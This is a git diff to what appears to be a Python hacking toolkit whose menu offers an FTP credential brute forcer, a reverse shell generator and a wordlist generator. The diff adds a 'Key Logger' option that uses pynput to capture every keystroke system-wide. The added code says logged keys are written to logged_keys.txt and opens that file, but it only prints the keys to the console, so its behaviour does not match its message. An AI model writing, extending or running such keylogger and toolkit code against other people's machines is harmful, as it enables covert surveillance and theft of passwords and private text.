@@ -22,12 +22,17 @@ try:
     from scapy.all import *
     from scapy.layers.http import HTTPRequest
     import json
+    from pynput.keyboard import Key, Listener
+    import logging
     import shodan
     from proxyscrape import create_collector, get_collector
     import random
     import ftplib
+    import colorama
     from paramiko import SSHClient
     import paramiko
+    import signal
+    colorama.init()
     modulesloaded = ('\u001b[32mOK\u001b[0m')
 except:
     modulesloaded = ('\u001b[31mFAILED\u001b[0m')
@@ -406,8 +411,6 @@ try:
 
 
 
-
-
                         if infosecchoice == "99":
                                 pass
 
@@ -423,6 +426,7 @@ try:
 \u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m05\u001b[0m] FTP Credential Brute Forcer
 \u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m06\u001b[0m] Reverse Shell Generator
 \u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m07\u001b[0m] Wordlist Generator
+\u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m08\u001b[0m] Key Logger
 \u001b[38;5;50m|\u001b[0m[\u001b[38;5;208m99\u001b[0m] Back
 \u001b[38;5;50m|\u001b[0m[ \u001b[38;5;226mCNTRL + C TO EXIT\u001b[0m ]\u001b[38;5;50m
 |
@@ -774,6 +778,26 @@ exec("/bin/sh -i");
                             time.sleep(3)
                             flushletters("Version 4.0.0")
                             print("\u001b[0m")
+                        
+                        if weaponlabchoice == "8":
+                            print("\n\u001b[38;5;50mKEY LOGGER\u001b[0m\n\nLogged Keys will be written to logged_keys.txt!\n\n")
+                            f = open('logged_keys.txt', 'w')
+                            def on_press(key):
+                                if str(key) == "Key.space":
+                                    print(' ', end="", flush=True)
+                                elif str(key) == "Key.enter":
+                                    print(' [ENTER] ')
+                                elif str(key) == "Key.backspace":
+                                    print(' [BACKSPACE] ', end="", flush=True)
+                                elif str(key) == "Key.shift":
+                                    pass
+                                else:
+                                    key = str(key)
+                                    key = key.replace("'", "")
+                                    print(key, end="", flush=True)
+                            
+                            with Listener(on_press=on_press) as listener:
+                                listener.join()
 
                                 
                         if weaponlabchoice == "99":
